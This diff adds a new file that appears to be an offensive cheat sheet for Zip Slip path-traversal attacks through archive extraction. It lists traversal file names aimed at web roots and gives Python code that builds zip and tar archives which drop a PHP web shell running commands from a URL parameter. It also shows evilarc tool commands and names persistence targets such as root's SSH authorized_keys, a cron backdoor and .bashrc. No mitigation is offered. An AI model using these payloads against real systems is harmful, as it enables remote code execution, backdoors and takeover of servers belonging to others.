@@ -1,0 +1,57 @@
+# ============================================================
+# Zip Slip — Path Traversal via Archive Extraction
+# ============================================================
+
+# ---- Attack Overview ----
+# Malicious archive contains files with "../" in path
+# Extraction writes files outside intended directory
+# If web root accessible → write web shell
+
+# ---- Malicious Filenames in Archive ----
+../shell.php
+../../shell.php
+../../../shell.php
+../../../../shell.php
+../../../var/www/html/shell.php
+../../../srv/http/shell.php
+../../../usr/local/apache2/htdocs/shell.php
+..\..\shell.php
+..\..\..\inetpub\wwwroot\shell.php
+
+# ---- Create Malicious Zip (Python) ----
+import zipfile
+
+with zipfile.ZipFile("zipslip.zip", "w") as z:
+    z.write("shell.php", arcname="../../../var/www/html/shell.php")
+
+# ---- Create Malicious Tar (Python) ----
+import tarfile, os
+
+with tarfile.open("tarslip.tar.gz", "w:gz") as t:
+    info = tarfile.TarInfo(name="../../../var/www/html/shell.php")
+    info.size = len(b"<?php system($_GET['c']); ?>")
+    import io
+    t.addfile(info, io.BytesIO(b"<?php system($_GET['c']); ?>"))
+
+# ---- evilarc (dedicated tool) ----
+# python evilarc.py shell.php -o tarslip.tar.gz -p ../../../var/www/html/ -f shell.php
+# python evilarc.py shell.php -o zipslip.zip -p ../../../var/www/html/ -f shell.php
+
+# ---- File Overwrite Targets ----
+# Write web shell to web root
+../../../var/www/html/shell.php
+# Overwrite SSH authorized_keys
+../../../root/.ssh/authorized_keys
+# Overwrite crontab
+../../../etc/cron.d/backdoor
+# Overwrite .bashrc
+../../../home/user/.bashrc
+# Overwrite binary
+../../../usr/local/bin/command
+
+# ---- Archive Formats Affected ----
+# .zip, .tar, .tar.gz, .tar.bz2, .tgz
+# .jar, .war, .ear (Java)
+# .apk (Android)
+# .ipa (iOS)
+# .nupkg (.NET)
